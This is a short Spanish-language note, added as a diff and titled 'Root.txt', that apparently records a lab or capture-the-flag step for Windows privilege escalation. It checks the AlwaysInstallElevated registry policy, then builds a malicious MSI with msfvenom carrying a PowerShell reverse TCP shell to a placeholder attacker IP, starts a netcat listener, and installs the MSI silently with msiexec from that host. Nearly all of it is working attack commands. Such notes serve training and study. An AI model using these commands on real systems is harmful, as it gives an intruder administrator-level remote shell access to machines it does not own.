@@ -1,0 +1,22 @@
+Root.txt 
+
+Mirar el registro de AlwaysInstallElevated:
+
+Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\installer\ -v AlwaysInstallElevated
+Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\installer\ -v AlwaysInstallElevated 
+
+Get-LocalUser -Name $username1 | select sid para ver nuestro sid o whoami /all 
+reg query HKU\sid\Software\Policies\Microsoft\Windows\installer
+
+Tambien podemos abrir el registry editor y verlo con la interfaz
+
+Vemos que esta hablitada la opcion AlwaysInstallElevated, por lo k todo lo k instalemo, se instalara con privilegios de administrador.
+
+Nos cresmo un msi malicioso:
+    -msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > evil.msi
+
+Y lo ejecutamos:
+    - nc -lvp PORT 
+    - msiexec.exe /q /i http://IP:PORT/evil.msi
+
+    
